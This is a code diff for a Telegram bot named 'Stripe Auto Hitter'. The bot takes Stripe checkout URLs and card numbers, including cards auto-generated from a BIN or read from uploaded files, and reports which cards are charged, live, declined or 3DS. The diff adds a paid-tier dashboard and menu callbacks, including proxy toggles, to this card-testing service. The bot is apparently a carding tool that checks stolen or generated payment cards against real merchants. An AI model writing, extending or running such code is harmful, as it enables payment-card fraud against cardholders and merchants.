         _active_hits.pop(hit_key, None)
+        final_text = await _build_hit_status_text(
+            merchant, price_str, success_url, cards, card_statuses, len(cards),
+            email=user_email, trial_info=trial_info,
+            hit_details=hit_detail_blocks if hit_detail_blocks else None
+        )
         summary = (
             f"\n─────────────────────\n"
-            f"{EMOJI['charged']} Charged: {len(results['charged'])}  "
-            f"{EMOJI['live']} Live: {len(results['live'])}  "
-            f"{EMOJI['declined']} Declined: {len(results['declined'])}  "
-            f"{EMOJI['3ds']} 3DS: {len(results['3ds'])}\n"
+            f"✅ Charged: {len(results['charged'])}  "
+            f"🟡 Live: {len(results['live'])}  "
+            f"❌ Declined: {len(results['declined'])}  "
+            f"🔐 3DS: {len(results['3ds'])}\n"
         )
-        final_text = await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, len(cards), email=user_email, trial_info=trial_info)
         await _safe_edit(loading_msg, final_text + summary, parse_mode=ParseMode.HTML)
 
     except Exception as e:
@@ -13719,20 +14233,43 @@ async def auto_hitter_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         url = extract_checkout_url(reply_full)
 
     if not url:
-        await message.reply_text(
-            f"{PE_TARGET} <b>STRIPE AUTO HITTER</b>\n\n"
-            f"{PE_CARD} <b>Usage:</b>\n"
-            "▸ <code>/hit url cc|mm|yy|cvv</code> — Hit single card\n"
-            "▸ <code>/hit url 453201</code> — Auto-generate 10 cards from BIN\n"
-            "▸ <code>/hit url</code> — Show saved BINs picker\n"
-            "▸ Reply .txt file + <code>/hit url</code> — Hit from file\n\n"
-            f"{PE_SAVE} <b>Saved BINs:</b>\n"
-            "▸ <code>/savebin name 453201</code> — Save a BIN\n"
-            "▸ <code>/mybins</code> — List saved BINs\n"
-            "▸ <code>/deletebin name</code> — Delete a BIN\n\n"
-            f"{PE_LINK} <b>Supported URLs:</b> checkout.stripe.com · buy.stripe.com · cs_live/cs_test",
-            parse_mode=ParseMode.HTML
-        )
+        # Show SEMEX-style dashboard when /hit is sent without a URL
+        from modules.database import get_user_check_stats
+        stats = get_user_check_stats(user.id)
+        rank  = get_user_rank(user.id)
+
+        # Build premium expiry info line
+        premium_info = "👤 Free — Limited access"
+        try:
+            from modules.database import _execute_with_retry
+            row = _execute_with_retry(
+                "SELECT premium, premium_expiry FROM users WHERE user_id = %s",
+                (user.id,), fetch_one=True
+            )
+            if is_owner(user.id):
+                premium_info = "👑 Owner — Unlimited access"
+            elif row and row.get("premium") and row.get("premium_expiry"):
+                expiry = row["premium_expiry"]
+                premium_info = f"💎 Premium | Expires {expiry.strftime('%Y-%m-%d')}"
+            elif row and row.get("premium"):
+                premium_info = "💎 Premium — Unlimited access"
+            elif is_approved(user.id):
+                premium_info = "✅ Approved — Free tier"
+        except:
+            premium_info = "✅ Active" if is_approved(user.id) else "👤 Free"
+
+        dash_text, dash_kb = _build_hit_dashboard(user, stats, rank, premium_info)
+        try:
+            gif_url = get_sexy_anime_gif("welcome")
+            if gif_url:
+                await message.reply_animation(
+                    animation=gif_url, caption=dash_text,
+                    parse_mode=ParseMode.HTML, reply_markup=dash_kb
+                )
+            else:
+                await message.reply_text(dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
+        except:
+            await message.reply_text(dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
         return
 
     # Strip command prefix (including optional @botname) and URL to isolate card/BIN
@@ -18384,7 +18921,7 @@ def main():
     application.add_handler(CommandHandler("revenue", revenue_stats))
     application.add_handler(CommandHandler("plans", show_plans))
     
-    application.add_handler(CallbackQueryHandler(hit_callback_handler, pattern="^(hit(all|first|close|stop)|sbin)_"))
+    application.add_handler(CallbackQueryHandler(hit_callback_handler, pattern="^(hit(all|first|close|stop)|sbin)_|^hit_(home|hitcards|generator|myhits|status|ranking|savedbins|plans|settings|toggle_proxy|toggle_site)$"))
     application.add_handler(CallbackQueryHandler(save_proxy_callback, pattern="^saveproxy_"))
     application.add_handler(CallbackQueryHandler(discard_proxy_callback, pattern="^discardproxy_"))
     application.add_handler(CallbackQueryHandler(regenerate_cards_callback, pattern="^regen"))
